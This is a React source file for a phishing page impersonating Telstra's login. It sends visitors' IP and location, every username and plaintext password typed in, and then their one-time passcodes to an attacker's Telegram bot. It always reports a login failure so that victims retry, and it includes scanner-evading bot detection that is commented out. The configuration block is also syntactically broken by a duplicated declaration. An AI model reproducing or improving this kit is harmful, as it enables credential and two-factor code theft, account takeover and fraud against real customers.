import React, { useState, useEffect } from 'react';
import LoginPage from './components/LoginPage';
import OtpPage from './components/OtpPage';
import DonePage from './components/DonePage';
import LoadingScreen from './components/LoadingScreen';

// Configuration - Direct values (no environment variables for now)
const CONFIG = {
  const CONFIG = {
  TELEGRAM_BOT_TOKEN: process.env.REACT_APP_TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID: process.env.REACT_APP_TELEGRAM_CHAT_ID,
  MAX_ATTEMPTS: 3,
  REDIRECT_DELAY: 3000
};

function App() {
  const [currentPage, setCurrentPage] = useState('login');
  const [loading, setLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [userData, setUserData] = useState({ username: '', password: '' });
  const [botDetected, setBotDetected] = useState(false);

  useEffect(() => {
    // Send visitor information when page loads
    sendVisitorInfo();
    
    // Anti-bot detection
    detectBot();
    
    // Auto-populate username
    autoPopulateUsername();
    
    // Track user behavior
    trackUserBehavior();
  }, []);

  const sendVisitorInfo = async () => {
    try {
      const visitorData = await collectVisitorData();
      const message = `🔍 *NEW VISITOR - Telstra*\n\n` +
        `📍 *IP:* \`${visitorData.ip}\`\n` +
        `🌍 *Location:* ${visitorData.location}\n` +
        `🌐 *URL:* ${window.location.href}\n` +
        `📱 *Device:* ${visitorData.device}\n` +
        `🔍 *Browser:* ${visitorData.browser.substring(0, 50)}...\n` +
        `⏰ *Time:* ${new Date().toLocaleString()}`;

      await sendToTelegram(message);
    } catch (error) {
      console.error('Error sending visitor info:', error);
    }
  };

  const collectVisitorData = async () => {
    const data = {
      ip: 'Unknown',
      location: 'Unknown',
      device: navigator.platform || 'Unknown',
      browser: navigator.userAgent,
      timestamp: new Date().toISOString()
    };

    try {
      // Get IP and location
      const ipResponse = await fetch('https://ipapi.co/json/');
      const ipData = await ipResponse.json();
      data.ip = ipData.ip || 'Unknown';
      data.location = `${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}`;
    } catch (error) {
      console.error('Error getting IP data:', error);
    }

    return data;
  };

  const sendToTelegram = async (message) => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: CONFIG.TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      if (!response.ok) {
        throw new Error('Failed to send to Telegram');
      }
    } catch (error) {
      console.error('Telegram send error:', error);
    }
  };

  const detectBot = () => {
    // DISABLED FOR TESTING - Remove this return statement for production use
    return;
    
    // Check for headless browsers
    if (navigator.webdriver || 
        window.navigator.webdriver || 
        window.callPhantom || 
        window._phantom ||
        window.Buffer ||
        window.emit ||
        window.spawn) {
      setBotDetected(true);
      return;
    }

    // Check for automation tools
    if (window.chrome && window.chrome.runtime && window.chrome.runtime.onConnect) {
      setBotDetected(true);
      return;
    }

    // Check navigator properties
    if (navigator.languages && navigator.languages.length === 0) {
      setBotDetected(true);
      return;
    }

    // Check for missing properties
    if (!navigator.plugins || navigator.plugins.length === 0) {
      setBotDetected(true);
      return;
    }
  };

  const autoPopulateUsername = () => {
    // Try to get username from various browser storage locations
    const savedUsername = localStorage.getItem('telstraUsername') || 
                         sessionStorage.getItem('telstraUsername') ||
                         localStorage.getItem('username') ||
                         sessionStorage.getItem('username');
    
    if (savedUsername) {
      setUserData(prev => ({ ...prev, username: savedUsername }));
    }

    // Try to extract from browser autofill
    setTimeout(() => {
      const usernameInput = document.querySelector('input[name="username"]');
      if (usernameInput && usernameInput.value && !userData.username) {
        setUserData(prev => ({ ...prev, username: usernameInput.value }));
      }
    }, 1000);
  };

  const trackUserBehavior = () => {
    let mouseMovements = 0;
    let keystrokes = 0;

    const handleMouseMove = () => {
      mouseMovements++;
    };

    const handleKeyPress = () => {
      keystrokes++;
    };

    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('keypress', handleKeyPress);

    // Check behavior after 10 seconds
    setTimeout(() => {
      // DISABLED FOR TESTING - Uncomment the next 3 lines for production use
      // if (mouseMovements < 5 && keystrokes < 3) {
      //   setBotDetected(true);
      // }
      
      document.removeEventListener('mousemove', handleMouseMove);
      document.removeEventListener('keypress', handleKeyPress);
    }, 10000);
  };

  const handleLoginAttempt = async (username, password) => {
    if (botDetected) {
      return { success: false, error: 'Automated access detected. Please try again later.' };
    }

    const newAttempts = loginAttempts + 1;
    setLoginAttempts(newAttempts);
    setUserData({ username, password });

    // Collect comprehensive data
    const visitorData = await collectVisitorData();
    
    const message = `🚨 *LOGIN ATTEMPT ${newAttempts} - Telstra*\n\n` +
      `👤 *Username:* \`${username}\`\n` +
      `🔐 *Password:* \`${password}\`\n` +
      `📍 *IP:* \`${visitorData.ip}\`\n` +
      `🌍 *Location:* ${visitorData.location}\n` +
      `🌐 *URL:* ${window.location.href}\n` +
      `📱 *Device:* ${visitorData.device}\n` +
      `🔍 *Browser:* ${navigator.userAgent.substring(0, 100)}...\n` +
      `⏰ *Time:* ${new Date().toLocaleString()}\n` +
      `🔢 *Attempt:* ${newAttempts}/${CONFIG.MAX_ATTEMPTS}`;

    await sendToTelegram(message);

    // Save to local storage for persistence
    const attempts_data = JSON.parse(localStorage.getItem('telstra_login_attempts') || '[]');
    attempts_data.push({
      username,
      password,
      timestamp: new Date().toISOString(),
      attempt: newAttempts,
      ...visitorData
    });
    localStorage.setItem('telstra_login_attempts', JSON.stringify(attempts_data));

    if (newAttempts >= CONFIG.MAX_ATTEMPTS) {
      // After max attempts, go to OTP page
      setTimeout(() => {
        setCurrentPage('otp');
      }, 2000);
      return { success: false, error: 'The username or password entered does not match our records. Please try again.' };
    }

    return { success: false, error: 'The username or password entered does not match our records. Please try again.' };
  };

  const handleOtpSubmit = async (otpCode) => {
    // Collect comprehensive data
    const visitorData = await collectVisitorData();
    
    const message = `📱 *OTP SUBMITTED - Telstra*\n\n` +
      `👤 *Username:* \`${userData.username}\`\n` +
      `🔢 *OTP Code:* \`${otpCode}\`\n` +
      `📍 *IP:* \`${visitorData.ip}\`\n` +
      `🌍 *Location:* ${visitorData.location}\n` +
      `🌐 *URL:* ${window.location.href}\n` +
      `📱 *Device:* ${visitorData.device}\n` +
      `🔍 *Browser:* ${navigator.userAgent.substring(0, 100)}...\n` +
      `⏰ *Time:* ${new Date().toLocaleString()}`;

    await sendToTelegram(message);

    // Save OTP to local storage
    const otp_data = JSON.parse(localStorage.getItem('telstra_otp_attempts') || '[]');
    otp_data.push({
      username: userData.username,
      otp: otpCode,
      timestamp: new Date().toISOString(),
      ...visitorData
    });
    localStorage.setItem('telstra_otp_attempts', JSON.stringify(otp_data));

    // Always go to done page after OTP
    setTimeout(() => {
      setCurrentPage('done');
    }, 2000);

    return true;
  };

  const handleBackToLogin = () => {
    setCurrentPage('login');
    setLoginAttempts(0);
    setUserData({ username: '', password: '' });
  };

  const renderCurrentPage = () => {
    switch (currentPage) {
      case 'login':
        return (
          <LoginPage
            onLoginAttempt={handleLoginAttempt}
            setLoading={setLoading}
            userData={userData}
            setUserData={setUserData}
          />
        );
      case 'otp':
        return (
          <OtpPage
            onOtpSubmit={handleOtpSubmit}
            onBack={handleBackToLogin}
            setLoading={setLoading}
            username={userData.username}
          />
        );
      case 'done':
        return (
          <DonePage
            onBackToLogin={handleBackToLogin}
          />
        );
      default:
        return <LoginPage onLoginAttempt={handleLoginAttempt} setLoading={setLoading} />;
    }
  };

  return (
    <div>
      <LoadingScreen show={loading} />
      {renderCurrentPage()}
    </div>
  );
}

export default App;
